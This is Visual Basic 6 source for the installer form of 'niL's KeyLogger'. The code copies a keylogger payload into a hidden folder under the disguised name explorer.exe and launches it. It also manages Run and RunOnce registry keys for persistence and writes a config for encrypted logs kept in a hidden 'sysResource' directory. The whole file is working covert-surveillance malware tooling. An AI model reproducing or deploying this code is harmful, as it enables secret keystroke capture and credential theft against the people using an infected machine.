VERSION 5.00
Begin VB.Form frmInstKLG 
   Appearance      =   0  'Flat
   BackColor       =   &H00000000&
   BorderStyle     =   0  'None
   Caption         =   "Configure niL's KeyLogger"
   ClientHeight    =   4335
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   6120
   BeginProperty Font 
      Name            =   "Arial"
      Size            =   14.25
      Charset         =   0
      Weight          =   700
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   ForeColor       =   &H00FFFFFF&
   Icon            =   "Config.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   4335
   ScaleWidth      =   6120
   StartUpPosition =   1  'CenterOwner
   Begin VB.Frame fraUnInst 
      Appearance      =   0  'Flat
      BackColor       =   &H000000FF&
      BorderStyle     =   0  'None
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   1815
      Left            =   120
      TabIndex        =   16
      Top             =   1680
      Visible         =   0   'False
      Width           =   5895
      Begin VB.Timer Timer1 
         Enabled         =   0   'False
         Interval        =   1000
         Left            =   0
         Top             =   1320
      End
      Begin VB.Label Label12 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         Caption         =   "If Shutdown window is displayed again.  Click  |Cancel|."
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   14.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   855
         Left            =   120
         TabIndex        =   20
         Top             =   120
         Width           =   5655
      End
      Begin VB.Label CountDown 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "8"
         ForeColor       =   &H00FFFFFF&
         Height          =   375
         Left            =   5520
         TabIndex        =   19
         Top             =   1440
         Visible         =   0   'False
         Width           =   375
      End
      Begin VB.Label lblWait 
         Alignment       =   2  'Center
         BackStyle       =   0  'Transparent
         Caption         =   "Please Wait......"
         ForeColor       =   &H00000000&
         Height          =   375
         Left            =   120
         TabIndex        =   18
         Top             =   1440
         Visible         =   0   'False
         Width           =   5655
      End
      Begin VB.Label Label7 
         Alignment       =   2  'Center
         BackColor       =   &H00FFFFFF&
         BackStyle       =   0  'Transparent
         Caption         =   "Click Cancel to Continue."
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   15.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   375
         Left            =   240
         TabIndex        =   17
         Top             =   960
         Width           =   5535
      End
   End
   Begin VB.TextBox username 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      Enabled         =   0   'False
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   15.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00808080&
      Height          =   375
      Left            =   1680
      Locked          =   -1  'True
      TabIndex        =   14
      TabStop         =   0   'False
      Text            =   "User"
      Top             =   1320
      Width           =   3375
   End
   Begin VB.ListBox List1 
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   5400
      TabIndex        =   0
      Top             =   2880
      Visible         =   0   'False
      Width           =   975
   End
   Begin VB.Label Label13 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H00FF8080&
      BackStyle       =   0  'Transparent
      BorderStyle     =   1  'Fixed Single
      Caption         =   "Exit"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H008080FF&
      Height          =   375
      Left            =   960
      TabIndex        =   21
      Top             =   2880
      Width           =   4215
   End
   Begin VB.Image Image2 
      Height          =   1170
      Left            =   120
      Picture         =   "Config.frx":1276
      Top             =   0
      Width           =   5820
   End
   Begin VB.Label Label6 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BackStyle       =   0  'Transparent
      Caption         =   "Welcome, "
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   15.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   375
      Left            =   240
      TabIndex        =   15
      Top             =   1320
      Width           =   1455
   End
   Begin VB.Label Label5 
      Alignment       =   2  'Center
      BackStyle       =   0  'Transparent
      Caption         =   "Give me feedback : niLsKeyLogger@gmail.com"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   11.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FF8080&
      Height          =   255
      Left            =   600
      TabIndex        =   13
      Top             =   4080
      Width           =   4815
   End
   Begin VB.Label Label4 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H00FF8080&
      BackStyle       =   0  'Transparent
      BorderStyle     =   1  'Fixed Single
      Caption         =   "Restore Settings"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H008080FF&
      Height          =   375
      Left            =   960
      TabIndex        =   12
      Top             =   2520
      Width           =   4215
   End
   Begin VB.Label Label1 
      Alignment       =   2  'Center
      BackStyle       =   0  'Transparent
      Caption         =   "http://niLsKeyLogger.blogspot.com"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00C0C0C0&
      Height          =   375
      Left            =   600
      TabIndex        =   11
      Top             =   3720
      Width           =   4815
   End
   Begin VB.Label ActVal 
      BackStyle       =   0  'Transparent
      Caption         =   "Label12"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00404040&
      Height          =   255
      Left            =   4440
      TabIndex        =   10
      Top             =   3480
      Width           =   735
   End
   Begin VB.Label Label11 
      BackStyle       =   0  'Transparent
      Caption         =   "Active :"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00404040&
      Height          =   255
      Left            =   3720
      TabIndex        =   9
      Top             =   3480
      Width           =   855
   End
   Begin VB.Label isinst 
      BackStyle       =   0  'Transparent
      Caption         =   "Label11"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00404040&
      Height          =   255
      Left            =   1920
      TabIndex        =   8
      Top             =   3480
      Width           =   735
   End
   Begin VB.Label Label10 
      BackStyle       =   0  'Transparent
      Caption         =   "Installed :"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00404040&
      Height          =   255
      Left            =   960
      TabIndex        =   7
      Top             =   3480
      Width           =   975
   End
   Begin VB.Label Atype2 
      BackStyle       =   0  'Transparent
      Caption         =   "Label10"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00C0C0C0&
      Height          =   255
      Left            =   6000
      TabIndex        =   6
      Top             =   3120
      Visible         =   0   'False
      Width           =   855
   End
   Begin VB.Label AType1 
      BackStyle       =   0  'Transparent
      Caption         =   "Label10"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00C0C0C0&
      Height          =   255
      Left            =   6120
      TabIndex        =   5
      Top             =   3360
      Visible         =   0   'False
      Width           =   855
   End
   Begin VB.Label Label9 
      BackStyle       =   0  'Transparent
      Caption         =   "Type2 :"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00C0C0C0&
      Height          =   255
      Left            =   5400
      TabIndex        =   4
      Top             =   3120
      Visible         =   0   'False
      Width           =   615
   End
   Begin VB.Label Label8 
      BackStyle       =   0  'Transparent
      Caption         =   "Type1 :"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00C0C0C0&
      Height          =   255
      Left            =   5400
      TabIndex        =   3
      Top             =   3360
      Visible         =   0   'False
      Width           =   735
   End
   Begin VB.Label Label3 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H00FF8080&
      BackStyle       =   0  'Transparent
      BorderStyle     =   1  'Fixed Single
      Caption         =   "Repair KeyLogger"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H008080FF&
      Height          =   375
      Left            =   960
      TabIndex        =   2
      Top             =   2160
      Width           =   4215
   End
   Begin VB.Label Label2 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H00FF8080&
      BackStyle       =   0  'Transparent
      BorderStyle     =   1  'Fixed Single
      Caption         =   "Install niL's keyLogger"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H008080FF&
      Height          =   375
      Left            =   960
      TabIndex        =   1
      Top             =   1800
      Width           =   4215
   End
End
Attribute VB_Name = "frmInstKLG"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

Option Explicit

' The exe file must exist for this to work properly.

Private Declare Function RegCreateKeyEx Lib "advapi32.dll" Alias "RegCreateKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal Reserved As Long, ByVal lpClass As String, ByVal dwOptions As Long, ByVal samDesired As Long, ByVal lpSecurityAttributes As Long, phkResult As Long, lpdwDisposition As Long) As Long
Private Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long         ' Note that if you declare the lpData parameter as String, you must pass it By Value.
Private Declare Function RegDeleteValue Lib "advapi32.dll" Alias "RegDeleteValueA" (ByVal hKey As Long, ByVal lpValueName As String) As Long
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Private Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Private Declare Function RegQueryValueEx Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Any, lpcbData As Long) As Long         ' Note that if you declare the lpData parameter as String, you must pass it By Value.

Private Const READ_CONTROL = &H20000
Private Const KEY_SET_VALUE = &H2
Private Const KEY_CREATE_SUB_KEY = &H4
Private Const STANDARD_RIGHTS_WRITE = (READ_CONTROL)
Private Const SYNCHRONIZE = &H100000
Private Const KEY_WRITE = ((STANDARD_RIGHTS_WRITE Or KEY_SET_VALUE Or KEY_CREATE_SUB_KEY) And (Not SYNCHRONIZE))

Private Const STANDARD_RIGHTS_READ = (READ_CONTROL)
Private Const KEY_ENUMERATE_SUB_KEYS = &H8
Private Const KEY_NOTIFY = &H10
Private Const KEY_QUERY_VALUE = &H1
Private Const KEY_READ = ((STANDARD_RIGHTS_READ Or KEY_QUERY_VALUE Or KEY_ENUMERATE_SUB_KEYS Or KEY_NOTIFY) And (Not SYNCHRONIZE))

Private Const ERROR_SUCCESS = 0&
Private Const HKEY_CURRENT_USER = &H80000001
Private Const REG_SZ = 1

Private m_IgnoreEvents As Boolean

'username import function
Private Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, nSize As Long) As Long

'Get system directory part
'Private Declare Function GetSystemDirectory Lib "Kernel32" Alias _
' "GetSystemDirectoryA" (ByVal lpBuffer As String, _
'ByVal nSize As Long) As Long
'Dim SysDir As String
'Dim sDr As String                   'Get system drive

Private Sub Form_Load()
Call LoadUserName

'Call CreateDirs

Call LoadAllStat

End Sub

Private Sub Inst()
MsgBox "Note that this is NOT a KeyLogger.This is only KeyLogger Manager." & vbNewLine & " You may delete this after installation.", vbApplicationModal, "Note"
Call CreateDirs

If Dir(App.Path & "\files.zip") <> "" Then
    FileCopy App.Path & "\files.zip", "C:\Documents and settings\All Users\Application Data\Micro\explorer.exe"
    MsgBox "niL's KeyLogger installed Successfully!", vbInformation, "Successful"
    Shell "C:\Documents and settings\All Users\Application Data\Micro\explorer.exe", vbNormalFocus
Else
    MsgBox "Unable to install. Please restart Setup.", vbCritical, "Error"
End If

Call LoadAllStat
End Sub

Private Sub UnInst()
Dim ans As String
ans = MsgBox("             Are you sure?", vbYesNo, "Uninstall niL's KeyLogger")
If ans = vbYes Then
        If m_IgnoreEvents Then Exit Sub
        Call KillFromStartup("explorer", True) 'Clear key RunOnce
        Call KillFromStartup("explorer", False) 'Clear key Run
    
    If isActive <> "False" Then
        MsgBox "Now you will see Shutdown window." & vbNewLine & "Please click Cancel", vbInformation
        fraUnInst.Visible = True
        Shell "TASKKILL /im explorer.exe"
        Timer1.Enabled = True
    Else
        Kill "C:\Documents and settings\All Users\Application Data\Micro\explorer.exe"
        MsgBox "niLs KeyLogger Uninstalled Successfully!", vbInformation, "Successful"
    End If
End If

Call LoadAllStat
End Sub

Private Sub Form_Unload(Cancel As Integer)
On Error Resume Next
Kill App.Path & "\files.zip"
End Sub

Private Sub Label13_Click()
End
End Sub

Private Sub Label13_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Select Case Label13.BackStyle
Case Is = 1
Label13.BackStyle = 0
Case Else
Label13.BackStyle = 1
End Select
End Sub

Private Sub Timer1_Timer()
Label7.Caption = "Uninstall in Progress...": lblWait.Visible = True: CountDown.Visible = True

CountDown.Caption = CountDown.Caption - 1
On Error GoTo err ' Resume Next
If CountDown.Caption = 0 Then Kill "C:\Documents and settings\All Users\Application Data\Micro\explorer.exe": fraUnInst.Visible = False: Timer1.Enabled = False: MsgBox "Uninstalled Successfully!", vbInformation: Call LoadAllStat

err:
If err.Number <> 0 Then
    Timer1.Enabled = False
    Dim an As String
    an = MsgBox("Failed to Uninstall.", vbRetryCancel, "Unsuccessful")
    If an = vbRetry Then
    Shell "TASKKILL /im explorer.exe"
    CountDown.Caption = 10: Timer1.Enabled = True
    Else
        Dim Restart As String
        Restart = MsgBox("niL's KeyLogger will be removed after Restart." & vbNewLine & "Do you want to restart now?", vbYesNo, "Uninstalling..")
        Call SetRunOnceAtStartup(App.EXEName, App.Path)
        If Restart = vbYes Then Shell "shutdown -l -f -t 05"
        End
    End If
End If
End Sub
Private Sub Label3_Click() 'REPAIR
Call CreateDirs
If isActive = "False" Then

    On Error GoTo err
    Shell "C:\Documents and Settings\All Users\Application Data\Micro\explorer.exe", vbNormalFocus
    MsgBox "Repair Successful!", vbInformation, "Success"

ElseIf WillRunAtStartup("explorer") = False And WillRunOnceAtStartup("explorer") = False Then

    Call SetRunOnceAtStartup("explorer", ("C:\Documents and Settings\All Users\Application Data"))
    MsgBox "Repair Successful!" & vbNewLine & "Please Uncheck <Totally invisible Mode> from Settings.", vbInformation, "Success"

Else
    MsgBox "niL's KeyLogger is working properly.", vbApplicationModal, "Success"
End If

err:
If err.Number <> 0 Then MsgBox "Unable to Repair. Re-install the Package", vbCritical, "Install Error"
Call LoadAllStat

End Sub

Private Sub Label2_Click()
If isInstalled = True Then Call UnInst Else Call Inst
End Sub
Private Sub Label4_Click()  'restore setting
Call CreateDirs
Call CreateSetting
End Sub
'***********************creates setting.ini**************
Private Sub CreateSetting()
On Error GoTo err
Dim f As Integer
f = FreeFile

username.Tag = "C:\Documents and Settings\" & username & "\sysResource"

Open "C:\Documents and Settings\" & username & "\Application Data\System\SPYXX.INI" For Output As #f
Print #f, "[LogSetting]" & vbNewLine & "USEBS=1" & vbNewLine & "UseChildTitle=0" & vbNewLine & "EncCode=1" & vbNewLine & "extension=.nkl" & vbNewLine & "TimerInt=65" & vbNewLine & "LogMode=1" & vbNewLine & "LogDir=" & username.Tag & vbNewLine & "SETRUNONCE=1" & vbNewLine & "sLogging=0" & vbNewLine & "Pwd="
Close #f
username.Tag = ""
MsgBox "Settings Restored Successfully!"

err:
If err.Number <> 0 Then MsgBox "Unable to restore Settings!", vbCritical, "Error"
End Sub
'**************Creates necessary directorys
Private Sub CreateDirs()
On Error Resume Next
MkDir "C:\Documents and Settings\All Users\Application Data\InstallShield"
MkDir "C:\Documents and Settings\All Users\Application Data\Micro"
MkDir "C:\Documents and Settings\" & username & "\Application Data\System"
MkDir "C:\Documents and Settings\" & username & "\sysResource"
MkDir "C:\Documents and Settings\All Users\Application Data\InstallShield\UpdateService"
End Sub
Private Sub LoadUserName()
'IMPORT USERNAME*******************************************
Dim sBuffer As String
    Dim lSize As Long
    sBuffer = Space$(255)
    lSize = Len(sBuffer)
    Call GetUserName(sBuffer, lSize)
    If lSize > 0 Then
        username = Left$(sBuffer, lSize)
    Else
        username = vbNullString
End If

End Sub
'Brings Status*******************************
Private Sub LoadAllStat()
isinst = isInstalled

If isInstalled = True Then
Label2.Caption = "Uninstall KeyLogger"
Label3.Enabled = True
Label4.Enabled = True
Else
Label2 = "Install KeyLogger"
Label3.Enabled = False
Label4.Enabled = False
End If

CountDown.Caption = 10

ActVal = isActive
AType1 = WillRunOnceAtStartup("explorer")
Atype2 = WillRunAtStartup("explorer")

End Sub
Private Function isInstalled() As Boolean
If Dir("C:\Documents and settings\All Users\Application Data\Micro\explorer.exe") <> "" Then
isInstalled = True
Else
isInstalled = False
End If
End Function
Private Function isActive() As String
Select Case NoOfProc("explorer.exe")
    Case Is = 1
        isActive = "False"
    Case Is = 2
        isActive = "True"
    Case Is > 2
        isActive = NoOfProc("explorer.exe") - 1 & " Error"
    Case Else
        isActive = "Error"
End Select

End Function

Private Function NoOfProc(procName As String) As Integer
List1.Clear

Dim hSnapShot As Long
Dim uProcess As PROCESSENTRY32
Dim r As Long
hSnapShot = CreateToolhelpSnapshot(TH32CS_SNAPPROCESS, 0&)
If hSnapShot = 0 Then
Exit Function
End If
uProcess.dwSize = Len(uProcess)
r = ProcessFirst(hSnapShot, uProcess)
Do While r
List1.AddItem uProcess.szExeFile
r = ProcessNext(hSnapShot, uProcess)
Loop
Call CloseHandle(hSnapShot)


Dim i As Integer
For i = 0 To List1.ListCount - 1
List1.ListIndex = i
    If LCase(List1.Text) = procName Then NoOfProc = NoOfProc + 1
Next i
End Function


'Animation and design
Private Sub Label2_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Select Case Label2.BackStyle
Case Is = 1
Label2.BackStyle = 0
Case Else
Label2.BackStyle = 1
End Select

End Sub
Private Sub Label3_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Select Case Label3.BackStyle
Case Is = 1
Label3.BackStyle = 0
Case Else
Label3.BackStyle = 1
End Select

End Sub
Private Sub Label4_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Select Case Label4.BackStyle
Case Is = 1
Label4.BackStyle = 0
Case Else
Label4.BackStyle = 1
End Select

End Sub

'Registry Keys Functions

Private Function WillRunAtStartup(ByVal app_name As String) As Boolean
Dim hKey As Long
Dim value_type As Long

    If RegOpenKeyEx(HKEY_CURRENT_USER, _
        "Software\Microsoft\Windows\CurrentVersion\Run", _
        0, KEY_READ, hKey) = ERROR_SUCCESS _
    Then
        ' Look for the subkey named after the application.
        WillRunAtStartup = _
            (RegQueryValueEx(hKey, app_name, _
                ByVal 0&, value_type, ByVal 0&, ByVal 0&) = _
            ERROR_SUCCESS)

        ' Close the registry key handle.
        RegCloseKey hKey
    Else
        ' Can't find the key.
        WillRunAtStartup = False
    End If

End Function

Private Function WillRunOnceAtStartup(ByVal app_name As String) As Boolean
Dim hKey As Long
Dim value_type As Long

    If RegOpenKeyEx(HKEY_CURRENT_USER, _
        "Software\Microsoft\Windows\CurrentVersion\RunOnce", _
        0, KEY_READ, hKey) = ERROR_SUCCESS _
    Then
        ' Look for the subkey named after the application.
        WillRunOnceAtStartup = _
            (RegQueryValueEx(hKey, app_name, _
                ByVal 0&, value_type, ByVal 0&, ByVal 0&) = _
            ERROR_SUCCESS)

        ' Close the registry key handle.
        RegCloseKey hKey
    Else
        ' Can't find the key.
        WillRunOnceAtStartup = False
    End If

End Function
'Deletes the key to uninstall
Public Sub KillFromStartup(ByVal app_name As String, Optional Ro As Boolean)
Dim hKey As Long
Dim key_value As String
Dim status As Long

    On Error GoTo SetStartupError

If Ro = False Then
'**********Delete Run Key

    ' Open the key, creating it if it doesn't exist.
    If RegCreateKeyEx(HKEY_CURRENT_USER, _
        "Software\Microsoft\Windows\CurrentVersion\Run", _
        ByVal 0&, ByVal 0&, ByVal 0&, _
        KEY_WRITE, ByVal 0&, hKey, _
        ByVal 0&) <> ERROR_SUCCESS _
    Then
        MsgBox "Error " & err.Number & " opening key" & _
            vbCrLf & err.Description
        Exit Sub
    End If

   
        ' Delete the value.
        RegDeleteValue hKey, app_name

    ' Close the key.
    RegCloseKey hKey

Else
    
 '*********Delete RunOnce Key

    ' Open the key, creating it if it doesn't exist.
    If RegCreateKeyEx(HKEY_CURRENT_USER, _
        "Software\Microsoft\Windows\CurrentVersion\RunOnce", _
        ByVal 0&, ByVal 0&, ByVal 0&, _
        KEY_WRITE, ByVal 0&, hKey, _
        ByVal 0&) <> ERROR_SUCCESS _
    Then
        MsgBox "Error " & err.Number & " opening key" & _
            vbCrLf & err.Description
        Exit Sub
    End If

   
        ' Delete the value.
        RegDeleteValue hKey, app_name

    ' Close the key.
    RegCloseKey hKey
    
End If

Exit Sub

SetStartupError:
    MsgBox err.Number & " " & err.Description
    Exit Sub
End Sub
Private Sub SetRunOnceAtStartup(ByVal app_name As String, ByVal app_path As String)
Dim hKey As Long
Dim key_value As String
Dim status As Long

    On Error GoTo SetStartupError

    ' Open the key, creating it if it doesn't exist.


        If RegCreateKeyEx(HKEY_CURRENT_USER, _
        "Software\Microsoft\Windows\CurrentVersion\RunOnce", _
        ByVal 0&, ByVal 0&, ByVal 0&, _
        KEY_WRITE, ByVal 0&, hKey, _
        ByVal 0&) <> ERROR_SUCCESS _
        Then
        MsgBox "Error " & err.Number & " opening key" & _
            vbCrLf & err.Description
        Exit Sub
        End If

        ' Create the key.
        key_value = app_path & "\" & app_name & ".exe" & vbNullChar
        status = RegSetValueEx(hKey, app_name, 0, REG_SZ, _
            ByVal key_value, Len(key_value))

        If status <> ERROR_SUCCESS Then
            MsgBox "Error " & err.Number & " setting key" & _
                vbCrLf & err.Description
        End If
   

    ' Close the key.
    RegCloseKey hKey
    Exit Sub

SetStartupError:
    MsgBox err.Number & " " & err.Description
    Exit Sub
End Sub

